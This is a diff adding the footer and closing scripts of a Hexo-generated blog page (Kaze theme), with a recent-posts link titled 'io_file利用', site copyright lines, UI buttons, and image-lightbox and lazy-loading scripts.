+        <a href="/2022/09/07/io-file%E5%88%A9%E7%94%A8/"><div class="recent-posts-item-content">io_file利用</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020
+          
+          
+                - 
+                2022
+          
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          幽林
+        </a>
+      </div>
+    </div>
+
+    
+      <div class="footer-dsc">
+        
+          Powered by
+          <a 
+            href="https://hexo.io/" 
+            class="footer-link" 
+            target="_blank" 
+            rel="nofollow noopener noreferrer">
+            &nbsp;Hexo
+          </a>
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          Theme -
+          <a 
+            href="https://github.com/theme-kaze" 
+            class="footer-link" 
+            target="_blank"
+            rel="nofollow noopener noreferrer">
+            &nbsp;Kaze
+          </a>
+        
+      </div>
+    
+    
+    
+    
+</footer>
+ 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton"
+  aria-label="menu button"
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+    
+    <script src="//instant.page/5.1.0" type="module"
+      integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
+    
+    
+  </body>
+</html>
